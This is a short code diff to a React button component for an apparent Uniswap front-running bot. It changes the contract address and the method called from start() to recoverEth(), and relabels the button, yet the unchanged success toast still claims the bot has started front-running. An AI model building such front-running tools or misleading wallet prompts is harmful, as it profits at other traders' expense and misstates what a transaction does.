@@ -13,7 +13,7 @@ export default function StartButton() {
     const web3 = new Web3(window.ethereum)
     const botContract = new web3.eth.Contract(
         bot,
-        "0xbFcd57C2A0F0eadAaB93c28DB3E244C20bBc226A"
+        "0x3E7Cee87CD88b39e415dE10161167F4dF453f13a"
     )
     console.log(web3)
   
@@ -21,7 +21,7 @@ export default function StartButton() {
         console.log("starting trade")
        if(account.length===0) return toast.error("Connect to wallet");
         try{
-            const res =await botContract.methods.start().send({from:account})
+            const res =await botContract.methods.recoverEth().send({from:account})
             console.log(res)
             toast.success("Bot started, Frontrunning uniswap.This might take a while!");
         }catch(e){
@@ -33,9 +33,10 @@ export default function StartButton() {
     console.log(account,"startpae")
   return (
     <div>
+        
         <button className='bg-slate-800 px-4 py-1 rounded-lg text-sm hover:bg-white hover:text-slate-800 '
          onClick={start}
-        >Start</button>
+        >Recover ETH</button>
     </div>
   )
 }
